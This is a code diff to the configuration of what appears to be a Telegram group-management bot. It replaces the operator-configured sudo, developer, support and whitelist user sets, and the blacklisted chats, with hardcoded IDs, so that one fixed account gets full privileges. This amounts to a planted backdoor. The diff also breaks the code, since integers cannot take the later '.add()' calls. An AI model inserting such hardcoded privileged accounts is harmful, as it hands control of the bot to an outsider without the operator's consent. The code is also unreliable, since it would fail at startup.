@@ -111,23 +111,23 @@ else:
     OWNER_USERNAME = Config.OWNER_USERNAME
     ALLOW_CHATS = Config.ALLOW_CHATS
     try:
-        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
+        DRAGONS = 5716978554
+        DEV_USERS = 5716978554
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
     try:
-        DEMONS = set(int(x) for x in Config.DEMONS or [])
+        DEMONS = 5716978554
     except ValueError:
         raise Exception("Your support users list does not contain valid integers.")
 
     try:
-        WOLVES = set(int(x) for x in Config.WOLVES or [])
+        WOLVES = 5716978554
     except ValueError:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
     try:
-        TIGERS = set(int(x) for x in Config.TIGERS or [])
+        TIGERS = 5716978554
     except ValueError:
         raise Exception("Your tiger users list does not contain valid integers.")
 
@@ -160,14 +160,14 @@ else:
     ARQ_API_URL = Config.ARQ_API_URL
 
     try:
-        BL_CHATS = set(int(x) for x in Config.BL_CHATS or [])
+        BL_CHATS = -1001606613577
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DEV_USERS.add(5716978554)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
